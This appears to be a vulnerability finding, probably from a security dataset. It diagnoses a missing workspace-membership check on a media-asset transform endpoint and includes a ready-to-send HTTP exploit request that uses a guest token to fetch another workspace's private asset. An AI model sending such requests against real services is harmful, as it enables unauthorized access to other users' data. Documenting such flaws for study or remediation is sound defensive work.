diagnosis: The endpoint streams and transforms workspace media assets using req.params.assetId without checking whether the requesting user is a member of the workspace that uploaded the asset. Any user can access other workspaces' private brand SVG assets and badges.
exploit_request:
GET /workspace/assets/asset_corp_logo_3310/transform HTTP/1.1
Host: cdn.brandhub.internal:4040
Cookie: workspace_token=ws_guest_5521
Accept: image/svg+xml
